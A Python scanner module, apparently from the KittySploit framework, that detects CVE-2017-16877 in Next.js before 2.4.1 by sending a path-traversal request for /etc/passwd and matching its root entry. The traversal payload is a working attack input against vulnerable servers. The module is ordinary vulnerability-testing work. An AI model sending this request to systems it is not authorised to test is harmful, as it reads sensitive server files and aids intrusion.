#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ZEIT Next."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Nextjs <2.4.1 - Local File Inclusion Detection',
        'description': 'ZEIT Next.js before 2.4.1 is susceptible to local file inclusion via the /_next and /static request namespace, allowing attackers to obtain sensitive information.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2017', 'nextjs', 'lfi', 'traversal', 'zeit', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://medium.com/@theRaz0r/arbitrary-file-reading-in-next-js-2-4-1-34104c4e75e9',
            'https://github.com/zeit/next.js/releases/tag/2.4.1',
            'https://nvd.nist.gov/vuln/detail/CVE-2017-16877',
            'https://github.com/vercel/next.js/commit/02fe7cf63f6265d73bdaf8bc50a4f2fb539dcd00',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2017-16877',
    }

    def run(self):
        r = self.http_request(method="GET", path='/_next/../../../../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Nextjs <2.4.1 - Local File Inclusion detected",
                path='/_next/../../../../../../../../../../etc/passwd',
            )
            return True
        return False

